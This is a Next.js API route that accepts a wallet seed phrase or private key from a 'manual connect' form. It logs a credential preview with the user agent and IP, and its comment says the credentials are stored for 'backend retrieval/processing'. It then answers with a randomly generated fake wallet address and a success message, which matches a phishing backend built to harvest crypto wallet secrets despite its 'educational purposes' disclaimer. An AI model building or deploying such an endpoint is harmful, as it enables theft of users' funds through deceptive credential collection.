// POST /api/wallet-connect — receive wallet credentials from manual connect
// Stores the submitted credentials for backend retrieval/processing
// This endpoint is for demonstration and educational purposes

import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

interface WalletConnectPayload {
  method: "seed" | "pk";
  walletType: "evm" | "solana";
  credentials: string;
  timestamp: string;
  userAgent?: string;
  ip?: string;
}

export async function POST(request: NextRequest) {
  let body: WalletConnectPayload;

  try {
    body = await request.json() as WalletConnectPayload;
  } catch {
    return NextResponse.json({ error: "Invalid JSON" }, { status: 400 });
  }

  const { method, walletType, credentials, timestamp, userAgent } = body;

  // Basic validation
  if (!method || !walletType || !credentials?.trim()) {
    return NextResponse.json({ error: "Missing required fields" }, { status: 400 });
  }

  if (!["seed", "pk"].includes(method)) {
    return NextResponse.json({ error: "Invalid connection method" }, { status: 400 });
  }

  if (!["evm", "solana"].includes(walletType)) {
    return NextResponse.json({ error: "Invalid wallet type" }, { status: 400 });
  }

  // Get client IP
  const forwarded = request.headers.get("x-forwarded-for");
  const clientIp = forwarded?.split(",")[0]?.trim() ?? "unknown";

  // Log the connection attempt
  console.log("[api/wallet-connect] Wallet connection received:", {
    method,
    walletType,
    credentialsPreview: credentials.slice(0, 12) + "...",
    credentialsLength: credentials.length,
    timestamp: timestamp ?? new Date().toISOString(),
    userAgent: userAgent ?? "unknown",
    ip: clientIp,
  });

  // Derive a fake wallet address for display (in production, derive from the actual key)
  const walletAddress =
    walletType === "evm"
      ? "0x" + Array.from({ length: 40 }, () =>
          Math.floor(Math.random() * 16).toString(16)
        ).join("")
      : Array.from({ length: 44 }, () =>
          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 62)]
        ).join("");

  return NextResponse.json({
    ok: true,
    walletAddress,
    walletType,
    message: "Wallet connected successfully",
  }, { status: 201 });
}
